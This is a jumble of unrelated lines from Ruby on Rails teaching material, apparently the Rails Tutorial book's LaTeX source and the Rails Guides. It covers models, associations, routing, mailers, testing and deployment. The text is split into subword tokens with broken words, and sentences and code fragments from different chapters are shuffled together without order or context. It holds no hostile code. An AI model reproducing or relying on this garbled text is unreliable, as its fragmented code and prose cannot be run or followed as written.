▁When ▁the ▁user ▁click s ▁the ▁link , ▁find ▁the ▁user ▁by ▁email ▁address , ▁and ▁then ▁ authenticate ▁the ▁token ▁by ▁compar ing ▁to ▁the ▁reset ▁digest .
▁as ▁show n ▁in ▁Listing ~\ ref { code : activation _ digest _ test } .
▁You ▁can ▁turn ▁off ▁digest s ▁by ▁updating ▁` config / environments / development ▖ rb ` ▁to ╼ include :
▁create ▁app / views / blorgh / articles / _ form ▖ html ▖ erb
▁The ▁next ▁step ▁is ▁to ▁switch ▁the ▁` Blorgh :: Article ` ▁model ▁over ▁to ▁this ▁new ▁setting ▖╼
▁t ▖ belongs _ to ▁: assembly
▁P r in ting ▁the ▁public ▁key ▁using ▁\ k ode { cat } .
▁gem ▁' sass - rails ', ▁' ~ > ▁3▖1 ▖ 7 '
▁In ▁Rails , ▁an ▁ _ association _ ▁is ▁a ▁connection ▁between ▁two ▁Active ▁Record ▁models ▖
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ problem _ with _ the _ data _ model }, ▁we ' ll ▁a do p t ▁Twitter ' s ▁convention ▁of ▁using ▁`` following '' ▁as ▁a ▁ label ▁for ▁followed ▁users , ▁as ▁in ▁`` 50 ▁following '' .
▁flash [: symbol ] ▁= ▁" a ▁symbol "
▁Re s po nd ing ▁to ▁Ajax ▁requests ▁in ▁the ▁Relationship s ▁controller .
▁The ▁\ k ode { dependent : ▁: destroy } ▁option ▁cause s ▁objects ▁to ▁be ▁destroyed ▁at ▁the ▁same ▁time ▁as ▁ associated ▁objects .
▁Client ▖ includes (" orders ")▖ where ( first _ name : ▁' Ryan ', ▁orders : ▁ { ▁status : ▁' receive d ' ▁ }) ▖ count
▁route ▁get ▁" users / new "
▁# ▁ Word s ▁have ▁the ▁ palindrome ?
▁" Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App "
▁Sometimes ▁this ▁doesn ' t ▁work , ▁though , ▁and ▁you ▁can ▁ kill ▁all ▁the ▁process es ▁with ▁name ▁\ text tt { spring } ▁using ▁the ▁\ text tt { p kill } ▁command ▁as ▁follows :
▁ Adding ▁indices ▁for ▁the ▁\ k ode { relationships } ▁table .
▁# ▁=> ▁[" David "]
▁The ▁method ▁` with _ indifferent _ access ` ▁returns ▁an ▁` ActiveSupport :: Hash With I ndifferentAccess ` ▁out ▁of ▁its ▁receiver :
▁1▖ ordinal ▁# ▁=> ▁" st "
▁< video ▁src ="/ video s / mov i e ▖ ogg " ▁/>
▁Ou r ▁strategy ▁for ▁the ▁\ k ode { create } ▁action ▁is ▁to ▁use ▁the ▁form ▁submission ▁to ▁make ▁a ▁new ▁user ▁object ▁using ▁\ k ode { User ▖ new }, ▁try ▁( and ▁fail ) ▁to ▁save ▁that ▁user , ▁and ▁then ▁render ▁the ▁signup ▁page ▁for ▁possible ▁re submission .
▁With ▁the ▁model ▁in ▁hand , ▁you ▁can ▁turn ▁your ▁a tt en tion ▁to ▁creating ▁a ▁matching ╼ controller ▖
▁ Follow ing ▁the ▁convention al ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Re presentational _ State _ Transfer } { REST ▁architecture } ▁favor ed ▁by ▁Rails , ▁we ' ll ▁call ▁the ▁action ▁for ▁new ▁users ▁\ k ode { new }, ▁which ▁we ▁can ▁arrange ▁to ▁create ▁automatically ▁by ▁passing ▁\ k ode { new } ▁as ▁an ▁argument ▁to ▁\ k ode { generate } .
▁Such ▁customizations ▁can ▁be ▁achieve d ▁via ▁a ▁scope ▁block ▖
▁# ▁R a is e ▁exception
▁def ▁pa id _ with _ card ?
▁* ▁` build _ middleware _ stack ` ▁Buil d s ▁the ▁middleware ▁ stack ▁for ▁the ▁application , ▁return ing ▁an ▁object ▁which ▁has ▁a ▁` call ` ▁method ▁which ▁take s ▁a ▁Rack ▁environment ▁object ▁for ▁the ▁request .
▁=> ▁17
▁In spec ting ▁and ▁Testing ▁Route s
▁In ▁addition ▁to ▁ com ing ▁ equ ip ped ▁with ▁a ▁large ▁number ▁of ▁built - in ▁function s ▁for ▁use ▁in ▁the ▁views , ▁Rails ▁also ▁allows ▁the ▁creation ▁of ▁new ▁one s .
▁H app ily , ▁with ▁Rails ▁we ▁can ▁write ▁tests ▁to ▁automate ▁the ▁testing ▁of ▁forms .
▁get ▁' * path ', ▁to : ▁' b la c k list # index ',
▁This ▁means ▁that ▁a ▁simple ▁call ▁to ▁` to _ formatted _ s ` ▁or ▁` to _ s ` ▁will ▁result ▁in ▁ float ing ▁point ▁representation ▁instead ▁of ▁engine er ing ▁notation :
▁This ▁method ▁receive s ▁an ▁arbitrar y ▁number ▁of ▁exception ▁classes ▖
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁config ▖ assets ▖ raise _ run time _ errors ▁= ▁false
▁# ▁=> ▁Mon , ▁ 02 ▁A ug ▁2010 ▁23:2 1 : 11 ▁UTC ▁+00:00
▁App ly ing ▁the ▁regular ▁expression ▁from ▁Table ~\ ref { table : valid _ email _ regex } ▁to ▁the ▁\ k ode { email } ▁format ▁validation ▁yields ▁the ▁code ▁in ▁Listing ~\ ref { code : validates _ format _ of _ email } .
▁class ▁User ▁< ▁ActiveRecord :: Base
▁#### ▁Implement ing ▁De c or at or ▁ Pattern ▁Using ▁ Class # class _ eval
▁this ▁way :
▁* ▁` mail ` ▁- ▁The ▁actual ▁email ▁message , ▁we ▁are ▁passing ▁the ▁`: to ` ▁and ▁`: subject `╼ headers ▁in .
▁ Adding ▁a ▁second ▁user ▁to ▁the ▁fixture ▁file .
▁Fix t ure s ▁support ▁the ▁creation ▁of ▁associations .
▁as ▁show n ▁in ▁Listing ~\ ref { code : signin _ form } .
▁- 2 1 ▖ ordinalize ▁# ▁=> ▁" - 2 1 st "
▁The ▁ success or ▁to ▁\ emph { Web r at }, ▁Capybara ▁is ▁named ▁after ▁the ▁world ' s ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Capybara } { large st ▁ r ode nt } .
▁For ▁example , ▁a ▁ malicious ▁user ▁could ▁change ▁the ▁\ k ode { user \_ id } ▁attributes ▁on ▁microposts , ▁there by ▁associat ing ▁microposts ▁with ▁the ▁wrong ▁users .
▁Testing ▁the ▁Relationship ▁model ▁validations .
▁This ▁is ▁the ▁recommended ▁way ▁of ▁creating ▁a ▁ container ▁for ▁render ▁your ▁Active ▁Record ▁object , ▁as ▁it ▁add s ▁an ▁appropriate ▁class ▁and ▁id ▁attributes ▁to ▁that ▁ container ▖
▁For ▁example , ▁code ▁like
▁You ' re ▁then ▁responsib le ▁for ▁deal ing ▁with ▁the ▁ conflict ▁by ▁re s c u ing ▁the ▁exception ▁and ▁either ▁roll ing ▁back , ▁m er g ing , ▁or ▁otherwise ▁apply ▁the ▁ business ▁logic ▁needed ▁to ▁re s ol ve ▁the ▁ conflict .
▁* ▁h im ▁or ▁ her ▖▖▖ ▁use ▁them .
▁These ▁are ▁inserted ▁by ▁Rails ▁to ▁ensure ▁that ▁browsers ▁ reload ▁the ▁CSS ▁when ▁it ▁changes ▁on ▁the ▁server ▖)
▁A lthough ▁the ▁sample ▁app ▁has ▁yet ▁to ▁accomplish ▁anything ▁useful , ▁we ▁have ▁ la id ▁an ▁essential ▁foundation ▁for ▁all ▁future ▁development .
▁In ▁previous ▁versions ▁of ▁Rails , ▁the ▁\ k ode { rails ▖ png } ▁ logo ▁was ▁included ▁automatically ▁with ▁every ▁Rails ▁project , ▁but ▁in ▁the ▁latest ▁version ▁it ▁doesn ' t ▁get ▁generated ▁as ▁part ▁of ▁\ k ode { rails ▁new }, ▁so ▁you ▁should ▁ download ▁it ▁from ▁the ▁main ▁Ruby ▁on ▁Rails ▁page ▁at ▁\ href { http :// rubyonrails ▖ org / images / rails ▖ png } { http :// rubyonrails ▖ org / images / rails ▖ png } ▁and ▁place ▁it ▁in ▁the ▁\ k ode { app / assets / images / } ▁directory .
▁A ▁mockup ▁of ▁the ▁user ▁followers ▁page .
▁ ╼ ▁else
▁There ▁is ▁one ▁subtlety , ▁though : ▁on ▁\ emph { failed } ▁micropost ▁submission , ▁the ▁Home ▁page ▁expect s ▁an ▁\ k ode {@ feed \_ items } ▁instance ▁variable , ▁so ▁failed ▁submission s ▁current ly ▁break ▁( as ▁you ▁should ▁be ▁able ▁to ▁verify ▁by ▁running ▁your ▁test ▁suite ) .
▁Client ▖ connect ion ▖ select _ all (" SELECT ▁first _ name , ▁created _ at ▁FROM ▁clients ▁WHERE ▁id ▁= ▁'1' ")
▁Because ▁it ▁is ▁no m in ally ▁an ▁ acronym ▁for ▁\ emph { a synchronous ▁JavaScript ▁and ▁ XML }, ▁Ajax ▁is ▁some times ▁ mis s pe ll ed ▁`` A J A X '' , ▁even ▁though ▁the ▁\ href { http :// www ▖ adapt ive path ▖ com / ide as / ajax - new - app r o a ch - web - application s /}{ origin al ▁Ajax ▁article } ▁ s pe ll s ▁it ▁as ▁`` Ajax '' ▁throughout .
▁We ▁can ▁see ▁how ▁it ▁works ▁by ▁look ing ▁at ▁some ▁` rails ▁console ` ▁output :
▁The ▁method ▁` Hash # to _ query ` ▁accept s ▁an ▁optional ▁ namespace ▁for ▁the ▁keys :
▁ Strict ▁ Validations
▁E x ce p t ▁for ▁hashes , ▁given ▁an ▁un escape d ▁` key ` ▁this ▁method ▁construct s ▁the ▁part ▁of ▁a ▁query ▁string ▁that ▁would ▁map ▁such ▁key ▁to ▁what ▁` to _ param ` ▁returns ▖
▁* ▁` config ▖ console ` ▁allows ▁you ▁to ▁set ▁class ▁that ▁will ▁be ▁used ▁as ▁console ▁you ▁run ▁` rails ▁console ` ▖
▁initializer ▁" action _ controller ▖ set _ helpers _ path " ▁do ▁| app |
▁By ▁ placing ▁them ▁within ╼ this ▁namespaced ▁directory , ▁you ▁prevent ▁them ▁from ▁ possibl y ▁c la sh ing ▁with ╼ id ent ical ly - name d ▁controllers ▁within ▁other ▁engines ▁or ▁even ▁within ▁the ╼ application .
▁A ▁mockup ▁of ▁the ▁signup ▁failure ▁page .
▁### ▁` confirmation `
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : following _ followers _ action s }
▁The ▁following ▁is ▁an ▁ ex c er p t ▁from ▁the ▁[ J s ▖ Y a man n er @ m ]( http :// www ▖ s ymantec ▖ com / security _ response / write up ▖ js p ? doc id = 2006 - 06 12 11 - 4 1 11 - 99 & tab id = 1 ) ▁ Y a h oo ! ▁ Mail ▁[ w or m ]( http :// gr oo v in ▖ net / stuff / y a m m er ▖ t x t )▖
▁There ▁may ▁be ▁cases ▁in ▁which ▁you ▁want ▁to ▁skip ▁the ▁template ▁rendering ▁step ▁and ╼ s up p ly ▁the ▁email ▁ body ▁as ▁a ▁string ▖
▁ ╼\ end { code }╼\ end { code listing }╼╼ ╼ ▁% ▁subsection ▁testing _ title s ▁( end )╼╼ ▁\ subsection { Adding ▁page ▁title s ▁( Green )} ▁% ▁( fold )╼ ▁\ label { sec : adding _ page _ title s }╼╼
▁If ▁you ▁set ▁`: only _ integer ` ▁to ▁` true `, ▁then ▁it ▁will ▁use ▁the
▁ / login
▁ Relation s ▁using ▁` lock ` ▁are ▁usually ▁wrap ped ▁inside ▁a ▁ transaction ▁for ▁ preventing ▁ de ad lock ▁conditions .
▁The ▁method ▁` parent s ` ▁calls ▁` parent ` ▁on ▁the ▁receiver ▁and ▁up ward s ▁un til ▁` Object ` ▁is ▁reach ed ▖
▁base _ title
▁Here ▁we ▁see ▁that ▁passing ▁the ▁symbol ▁\ k ode { : length } ▁or ▁string ▁\ k ode { ' length ' } ▁to ▁\ k ode { send } ▁is ▁equivalent ▁to ▁calling ▁the ▁\ k ode { length } ▁method ▁on ▁the ▁given ▁object .
▁| ▁| ▁50 5 ▁| ▁: http _ version _ not _ support ed ▁|
▁The ▁( br o k en ) ▁site ▁layout ▁with ▁a ▁particular ly ▁long ▁word ▖ ~\ href { http :// railstutorial ▖ org / images / figures / long _ word _ micropost _ bootstrap - full ▖ png }{( full ▁size )}
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / qualified _ const ▖ rb ` .
▁As ▁in ▁previous ▁examples , ▁we ▁use ▁\ k ode { expect } ▁to ▁wrap ▁the ▁operation ▁in ▁a ▁block ▁and ▁test ▁for ▁an ▁ increment ▁or ▁d ec re ment ▁in ▁the ▁relevant ▁count .
▁### ▁` alias _ method _ chain `
▁" "▖ html _ safe ?
▁string
▁t ▖ integer ▁: publish er _ id
▁To ▁put ▁our ▁helper ▁to ▁work , ▁we ▁can ▁eliminate ▁the ▁unnecessary ▁word ▁`` Home '' ▁from ▁the ▁Home ▁page , ▁allow ing ▁it ▁to ▁ r ever t ▁to ▁the ▁base ▁title .
▁If ▁you ' d ▁like ▁to ▁add ▁conditions ▁to ▁your ▁find , ▁you ▁could ▁just ▁specify ▁them ▁in ▁there , ▁just ▁like ▁` Client ▖ where (" orders _ count ▁= ▁' 2 ' ") ` ▖
▁class ▁Create Employee s ▁< ▁ActiveRecord :: Migration
▁F u ll ▁command
▁To ▁get ▁the ▁User ▁model ▁working ▁in ▁production , ▁we ▁need ▁to ▁run ▁the ▁migrations ▁at ▁Heroku , ▁which ▁we ▁can ▁do ▁with ▁\ k ode { heroku ▁run } :
▁# ▁ Requir es ▁support ing ▁ ruby ▁files ▁with ▁custom ▁match ers ▁and ▁ macro s , ▁etc ,
▁ Adding ▁user ▁activation ▁methods ▁to ▁the ▁User ▁model .
▁By ▁the ▁way , ▁the ▁use ▁of ▁\ k ode { target =" \_ blank "} ▁in ▁the ▁Gravatar ▁link ▁is ▁a ▁ ne at ▁trick ▁to ▁get ▁the ▁browser ▁to ▁open ▁the ▁page ▁in ▁a ▁new ▁window ▁or ▁ tab , ▁which ▁is ▁convenient ▁behavior ▁when ▁link ing ▁to ▁a ▁third - part y ▁site .
▁There ▁are ▁many ▁options ▁for ▁version ▁control , ▁but ▁the ▁Rails ▁ community ▁has ▁large ly ▁standard ize d ▁on ▁\ href { http :// git - s cm ▖ com /}{ Git }, ▁a ▁distribute d ▁version ▁control ▁system ▁original ly ▁ developed ▁by ▁L in us ▁To r val d s ▁to ▁host ▁the ▁ Linux ▁ k ernel .
▁A ▁user ▁ row ▁in ▁the ▁SQLite ▁database ▁\ k ode { db / development ▖ sqlite 3 } .
▁If ▁you ▁do ▁run ▁into ▁perform ance ▁issues , ▁the ▁\ href { http :// rails lab ▖ new rel ic ▖ com / s caling - rails } { S caling ▁Rails } ▁series ▁from ▁G re g g ▁P o ll ac k ▁of ▁\ href { http :// env y lab s ▖ com /}{ E n v y ▁L abs } ▁is ▁a ▁good ▁place ▁to ▁start .
▁# ▁automatically .
▁The ▁result ▁is ▁the ▁ im press ive ly ▁ compact ▁code ▁in ▁Listing ~\ ref { code : index _ final _ refactoring } .
▁invoke ▁active _ record
▁### ▁` inquiry `
▁To ▁ prepare ▁the ▁system ▁for ▁deployment ▁to ▁production , ▁we ▁run ▁\ k ode { bundle ▁install } ▁with ▁a ▁special ▁flag ▁to ▁prevent ▁the ▁local ▁installation ▁of ▁any ▁production ▁gems ▁( which ▁in ▁this ▁case ▁consist s ▁of ~\ text tt { pg } ▁and ▁\ text tt { rails \_ 12 factor }) :
▁When ▁you ▁generate ▁a ▁scaffold ▁or ▁a ▁controller , ▁Rails ▁also ▁generates ▁a ▁JavaScript ╼ file ▁( or ▁CoffeeScript ▁file ▁if ▁the ▁` coffee - rails ` ▁gem ▁is ▁in ▁the ▁` Gemfile ` ) ▁and ▁a ╼ C ascad ing ▁Style ▁Sheet ▁file ▁( or ▁ SCSS ▁file ▁if ▁` sass - rails ` ▁is ▁in ▁the ▁` Gemfile ` )╼ for ▁that ▁controller ▖
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁ASC ▁LIMIT ▁3
▁< p > A ▁ product ▁of ▁D an is h ▁De sign ▁during ▁the ▁Wi n ter ▁of ▁' 7 9 ▖▖▖ </ p >
▁One ▁difference ▁here , ▁however , ▁is ▁that ▁each ╼ directory ▁contains ▁a ▁sub - directory ▁with ▁the ▁engine ▁name ▖
▁If ▁the ▁join ▁table ▁for ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁has ▁ additional ▁columns ▁ beyond ▁the ▁two ▁foreign ▁keys , ▁these ▁columns ▁will ▁be ▁added ▁as ▁attributes ▁to ▁records ▁retrieved ▁via ▁that ▁association ▖
▁Additional ly , ▁when ▁ generating ▁a ▁scaffold , ▁Rails ▁generates ╼ the ▁file ▁scaffold s ▖ css ▁( or ▁scaffold s ▖ css ▖ scss ▁if ▁` sass - rails ` ▁is ▁in ▁the ╼` Gemfile ` ▖)
▁" active "▖ inquiry ▖ inactive ?
▁ Asset s ▁can ▁also ▁come ▁from ▁external ▁source s ▁in ▁the ▁form ▁of ▁gems .
▁The ▁new ▁version ▁update s ▁` sanitize `, ▁so ▁it ▁can ▁take ▁a ▁` L oo fa h :: S crubber ` ▁for ╼ po w er ful ▁ s c r ub b ing .
▁On ▁ Linux , ▁you ▁can ▁accomplish ▁similar ▁things ▁with ▁\ k ode { a p t - get } ▁or ▁\ k ode { y um } .
▁We ▁need ▁the ▁methods ▁from ▁the ▁Sessions ▁helper ▁in ▁both ▁place s , ▁so ▁we ▁have ▁to ▁include ▁it ▁explicitly .
▁In ▁the ▁course ▁of ▁developing ▁the ▁ core ▁sample ▁application , ▁we ' ve ▁now ▁ en counter ed ▁four ▁resources --- users , ▁sessions , ▁account ▁ activations , ▁and ▁password ▁\ line break ▁resets --- but ▁only ▁the ▁first ▁of ▁these ▁is ▁back ed ▁by ▁an ▁Active ▁Record ▁model ▁with ▁a ▁table ▁in ▁the ▁database .
▁In ▁other ▁words , ▁if ▁a ▁non - logged - in ▁user ▁ tries ▁to ▁visit ▁the ▁edit ▁page , ▁after ▁ signing ▁in ▁the ▁user ▁will ▁be ▁ redirected ▁to ▁ / users /1 ▁instead ▁of ▁ / users /1/ edit .
▁### ▁Action ▁Pack
▁For ▁example , ▁if ▁you ▁set ▁` offset ( 11 ) `, ▁it ▁will ▁skip ▁the ▁first ▁ 11 ▁records .
▁middleware s ▁<< ▁[ Rails :: Rack :: Debugger ] ▁if ▁options [: debugger ]
▁ } ▖ ╼╼ \ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : beginning _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁get ▁' : controller ( / : action ( / : id ) ) '
▁@ assembly ▁= ▁@ part ▖ assemblies ▖ create ( { assembly _ name : ▁" Trans mis s ion ▁h ous ing " })
▁* ▁H oo k ing ▁the ▁engine ▁into ▁an ▁application .
▁The ▁Home ▁page ▁after ▁creating ▁a ▁new ▁micropost ▖ ~\ href { http :// railstutorial ▖ org / images / figures / micropost _ created _ bootstrap - full ▖ png }{( full ▁size )}
▁The ▁generated ▁account ▁activation ▁text ▁view .
▁The ▁Home ▁page ▁with ▁a ▁ proto - feed .
▁=> ▁false
▁C ur r ent ly , ▁the ▁form ▁fails ▁on ▁valid ▁submission .
▁=> ▁" development "
▁S tr ips ▁all ▁HTML ▁tags ▁from ▁the ▁ html , ▁including ▁comments .
▁client ▖ save
▁Create s ▁a ▁standard ▁input ▁field ▁of ▁email ▁type .
▁For ▁example , ▁consider ▁these ▁associations :
▁Whi le ▁a ▁CDN ▁is ▁describe d ▁as ▁being ▁good ▁for ▁ caching ▁assets , ▁in ▁real ity ▁cache s ▁the ╼ ent i re ▁request ▖
▁Be low ▁is ▁a ▁full - length ▁ RSS ▁example ▁actually ▁used ▁on ▁ Base c amp :
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about } .
▁O p en ▁` doc / api / index ▖ html `╼ ▁in ▁your ▁web ▁browser ▁to ▁explor e ▁the ▁API ▁documentation .
▁client ▖ visit s ▁ += ▁1
▁There ' s ▁an ▁ additional ▁ com plication , ▁though : ▁we ▁want ▁to ▁\ emph { associate } ▁each ▁micropost ▁with ▁a ▁particular ▁user ; ▁we ' ll ▁accomplish ▁this ▁by ▁record ing ▁the ▁\ k ode { user \_ id } ▁of ▁the ▁ owner ▁of ▁the ▁post .
▁In ▁this ▁section , ▁I ' ll ▁ ment ion ▁some ▁that ▁may ▁not ▁be .
▁The ▁only ▁really ▁trick y ▁part ▁is ▁verify ing ▁that ▁a ▁user ▁get s ▁delete d ▁when ▁an ▁admin ▁click s ▁on ▁a ▁delete ▁link , ▁which ▁we ' ll ▁accomplish ▁as ▁follows :
▁We ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : a _ user _ class } ▁the ▁idea ▁of ▁\ emph { mass ▁assignment }, ▁which ▁involve s ▁initializ ing ▁a ▁Ruby ▁variable ▁using ▁a ▁hash ▁of ▁values , ▁as ▁in
▁A lthough ▁hashes ▁resembl e ▁arrays , ▁one ▁important ▁difference ▁is ▁that ▁hashes ▁don ' t ▁generally ▁guarantee ▁keep ing ▁their ▁elements ▁in ▁a ▁particular ▁order
▁What ▁if ▁you ▁want ▁to ▁render ▁a ▁template ▁from ▁an ▁entire ly ▁different ▁controller ▁from ▁the ▁one ▁that ▁contains ▁the ▁action ▁code ?
▁from ▁Listing ~\ ref { code : html _ structure } ▁to
▁In ▁addition , ▁we ▁can ▁secure ly ▁ authenticate ▁users ▁using ▁a ▁given ▁password .
▁Active ▁Record ▁objects ▁can ▁be ▁created ▁from ▁a ▁hash , ▁a ▁block ▁or ▁have ▁their ╼ attributes ▁manually ▁set ▁after ▁creation ▖
▁### ▁C al c ul ation s
▁ Pro file s ▁with ▁follow ▁and ▁ unfollow ▁button s , ▁respectively , ▁appear ▁in ▁Figure ~\ ref { fig : profile _ follow _ button } ▁and ▁Figure ~\ ref { fig : profile _ unfollow _ button } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : carrier _ w a ve _ configuration } .
▁For ▁example , ▁in ▁this ▁console ▁session ▁we ▁use ▁\ k ode { send } ▁on ▁a ▁native ▁Ruby ▁object ▁to ▁find ▁the ▁length ▁of ▁an ▁array :
▁ ╼╼% ▁subsection ▁user _ destroy _ tests ▁( end )╼╼ ▁% ▁section ▁ deleting _ users ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : updating _ and _ deleting _ users _ co nclusion }╼╼
▁<%= ▁render ▁partial : ▁" customer ", ▁object : ▁@ new _ customer ▁%>
▁ New ▁applications ▁filter ▁out ▁passwords ▁by ▁adding ▁the ▁following ▁` config ▖ filter _ parameters += [: password ]` ▁in ▁` config / initializers / filter _ param eter _ logging ▖ rb ` .
▁If ▁you ▁think ▁about ▁it , ▁this ▁code ▁is ▁really ▁ st range : ▁it ▁appears ▁to ▁be ▁compar ing ▁a ▁ bcrypt ▁password ▁digest ▁directly ▁with ▁a ▁token , ▁which ▁would ▁ im p ly ▁\ emph { de crypt ing } ▁the ▁digest ▁in ▁order ▁to ▁compare ▁using ▁\ k ode {==} .
▁Now ▁that ▁you ▁have ▁configured ╼ your ▁CDN ▁server , ▁you ▁need ▁to ▁tell ▁browsers ▁to ▁use ▁your ▁CDN ▁to ▁gra b ▁assets ╼ instead ▁of ▁your ▁Rails ▁server ▁directly ▖
▁This ▁code ▁simply ▁reuse s ▁the ▁token ▁and ▁digest ▁methods ▁used ▁for ▁the ▁remember ▁token , ▁as ▁we ▁can ▁see ▁by ▁compar ing ▁with ▁the ▁\ k ode { remember } ▁method ▁from ▁Listing ~\ ref { code : user _ model _ remember } :
▁d ▖ next _ year ▁# ▁=> ▁Sun , ▁ 08 ▁May ▁2011
▁The ▁ er r at a ▁for ▁the ▁` PATCH ` ▁verb ▁[ spec if ies ▁that ▁a ▁' d if f ' ▁ media ▁type ▁should ▁be ╼ used ▁with ▁` PATCH ` ]( http :// www ▖ rfc - edit or ▖ org / er r at a _ search ▖ ph p ? rfc = 57 89 )▖ ▁One ╼ such ▁format ▁is ▁[ JSON ▁Patch ]( http :// to ol s ▖ i e t f ▖ org / html / rfc 6 9 02 )▖ ▁Whi le ▁Rails ╼ does ▁not ▁support ▁JSON ▁Patch ▁native ly , ▁it ' s ▁easy ▁enough ▁to ▁add ▁support :
▁The ▁be a u t i ful ▁interface ▁at ▁Heroku ▖ ~\ href { http :// railstutorial ▖ org / images / figures / heroku _ info _4_0 - full ▖ png }{( full ▁size )}
▁At ▁this ▁point , ▁creating ▁a ▁new ▁micropost ▁works ▁as ▁expected , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : micropost _ created } .
▁client ▁= ▁Client ▖ first (3)
▁For ▁ maximum ▁ compatibility ▁with ▁systems ▁that ▁don ' t ▁have ▁\ k ode { co } ▁configured , ▁this ▁tutorial ▁will ▁use ▁the ▁full ▁\ k ode { checkout } ▁command , ▁but ▁in ▁real ▁ life ▁I ▁ nearly ▁always ▁use ▁\ k ode { git ▁co } ▖)
▁After ▁finish ing ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁I ▁recommend ▁that ▁experience d ▁programmer s ▁read ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 19 3 3 9 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist } } ▁by ▁ David ~ A ▖ ▁B la c k , ▁\ href { http :// www ▖ a mazon ▖ com / Eloquent - Ruby - Addi s on - We s le y - P rofessional - Seri es / d p /0321 58 4 10 4/ }{\ emph { Eloquent ▁Ruby } } ▁by ▁ Russ ▁O l s en , ▁or ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 06 723 2 88 44 }{\ emph { The ▁Ruby ▁Way } } ▁by ▁H al ▁F ul to n , ▁which ▁is ▁also ▁fai r ly ▁advanced ▁but ▁take s ▁a ▁more ▁topic al ▁approach .
▁Some ▁of ▁the ▁idea s ▁are ▁fai r ly ▁advanced , ▁so ▁don ' t ▁worry ▁about ▁understanding ▁all ▁the ▁details ; ▁what ' s ▁important ▁is ▁that ▁by ▁the ▁end ▁of ▁the ▁process ▁we ' ll ▁have ▁deploy ed ▁our ▁application ▁to ▁the ▁live ▁web .
▁** O p t im ist ic ▁ lock ing ▁column **
▁would ▁produce ▁something ▁like :
▁By ▁the ▁time ▁you ▁finish ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁you ▁will ▁have ▁all ▁the ▁ s kill s ▁you ▁need ▁to ▁develop ▁and ▁deploy ▁your ▁own ▁custom ▁web ▁applications ▁with ▁Rails .
▁In st ance ▁variables ▁always ▁ begin ▁with ▁an ~\ k ode {@ } ▁sign , ▁and ▁are ▁\ k ode { nil } ▁when ▁undefined .
▁Defin e ▁a ▁\ k ode { user } ▁variable ▁using ▁the ▁fixtures .
▁Client ▖ where ( first _ name : ▁' Lifo ')▖ take
▁A ▁test ▁for ▁an ▁initially ▁valid ▁user ▖
▁In ▁the ▁\ emph { Rails ▁Tutorial }, ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁the ▁\ k ode { \_ path } ▁form ▁except ▁when ▁doing ▁redirect s , ▁where ▁we ' ll ▁use ▁the ▁\ k ode { \_ url } ▁form .
▁Using ▁key - value ▁pair s ▁in ▁the ▁feed ' s ▁\ k ode { where } ▁method ▖
▁ ╼ ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁The ▁ MySQL ▁adapter ▁add s ▁one ▁ additional ▁configuration ▁option :
▁The ▁first ▁line ,
▁Sometimes ▁it ▁will ▁make ▁sense ▁to ▁validate ▁an ▁object ▁only ▁when ▁a ▁given ▁ predicate ╼ is ▁ satisf i ed ▖
▁Create ▁a ▁` secrets ▖ yml ` ▁file ▁in ▁your ▁` config ` ▁folder ▁with ▁the ▁following ▁content :
▁* ▁` ENV [" RAILS _ C A C H E _ ID "] ` ▁and ▁` ENV [" RAILS _ A P P _ VERSION "] ` ▁are ▁used ▁to ▁generate ▁ expand ed ▁cache ▁keys ▁in ▁Rails ' ▁ caching ▁code ▖
▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁\ k ode { Application Controller }, ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application .
▁### ▁` has _ many ` ▁Association ▁Reference
▁If ▁you ▁already ▁use ▁this ▁ shared ▁folder ▁you ' ll ▁need ▁to ▁write ▁your ▁own ▁deployment ╼ t as k .
▁ SELECT ▁* ▁FROM ▁comments ▁WHERE ▁article _ id ▁= ▁10 ▁OR DER ▁BY ▁post ed _ at ▁DESC
▁However , ▁you ▁will ▁need ▁to ▁make ▁a ▁change ▁if ▁you ▁are ▁using ▁` form _ for ` ▁to ▁update ╼ a ▁resource ▁in ▁con j un c tion ▁with ▁a ▁custom ▁route ▁using ▁the ▁` PUT ` ▁HTTP ▁method :
▁In ▁addition , ▁a ▁well - written ▁test ▁tell s ▁a ▁co her ent ▁ s to ry , ▁and ▁break ing ▁it ▁up ▁into ▁individual ▁pieces ▁di s r up t s ▁the ▁ n ar ra tive .
▁To ▁test ▁this ▁ ordering , ▁we ▁first ▁create ▁a ▁couple ▁of ▁microposts ▁as ▁follows :
▁# ▁ jQuery ▁is ▁the ▁default ▁JavaScript ▁library ▁in ▁Rails ▁3▖1
▁Mailer s ▁are ▁really ▁just ▁another ▁way ▁to ▁render ▁a ▁view ▖
▁### ▁button _ to
▁A ▁test ▁for ▁ signing ▁out ▁a ▁user .
▁<% ▁end ▁%>
▁Then ▁ extract ▁the ▁d if f :
▁< section >
▁By ▁using ▁an ▁email ▁address ▁as ▁the ▁user name , ▁we ▁open ▁the ▁possibility ▁of ▁communicat ing ▁with ▁our ▁users ▁at ▁a ▁future ▁date ▁( Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }) .
